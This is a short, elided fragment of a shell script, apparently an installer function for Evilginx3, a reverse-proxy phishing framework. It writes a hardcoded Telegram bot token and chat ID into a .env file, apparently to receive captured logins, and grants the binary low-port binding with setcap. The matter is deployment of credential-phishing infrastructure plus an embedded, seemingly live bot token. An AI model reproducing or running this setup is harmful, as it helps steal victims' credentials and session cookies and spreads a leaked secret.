...
function setup_evilginx3 () {
    ...
    print_info "Creating .env file with TOKEN and CHAT_ID..."

    # Write parameters to .env file
    cat <<EOT >> $ENV_FILE
    TOKEN=7116285930:AAE_MHKDmX6vSgHy4MJwy9ghqfkutqsyFf0
    CHAT_ID=7150910205
EOT
    ...
    sudo setcap CAP_NET_BIND_SERVICE=+eip build/evilginx
